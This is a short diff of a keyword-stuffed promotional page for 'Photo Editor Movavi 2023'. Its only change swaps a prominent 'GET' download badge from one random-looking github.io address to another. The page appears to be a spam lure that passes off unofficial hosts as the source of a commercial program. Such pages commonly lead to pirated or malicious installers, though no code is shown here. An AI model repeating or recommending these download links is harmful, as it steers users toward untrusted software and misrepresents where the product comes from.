@@ -12,7 +12,7 @@ Photo Editor Movavi 2023 is desktop photo software for creators who want practic
 
 The app fits users comparing Movavi Photo Editor, Movavi photo editing software, and movavi photo editor download options before installing. It focuses on approachable tools: erase distracting objects, smooth skin carefully, sharpen details, restore aged photos, replace simple backgrounds, and export polished files for sharing. A movavi photo editor review usually highlights that the interface is built for speed, while Movavi Photo Editor features cover both automatic fixes and manual adjustments.
 
-[![GET Photo Editor Movavi](https://img.shields.io/badge/GET%20%E2%80%94%20Photo%20Editor%20Movavi-0078D6?style=for-the-badge&logoColor=white)](https://josiahlimwhft.github.io/.github/photo-editor-movavi-2023)
+[![GET Photo Editor Movavi](https://img.shields.io/badge/GET%20%E2%80%94%20Photo%20Editor%20Movavi-0078D6?style=for-the-badge&logoColor=white)](https://louwestenuowhup.github.io/.github/photo-editor-movavi-2023)
 
 ---
 
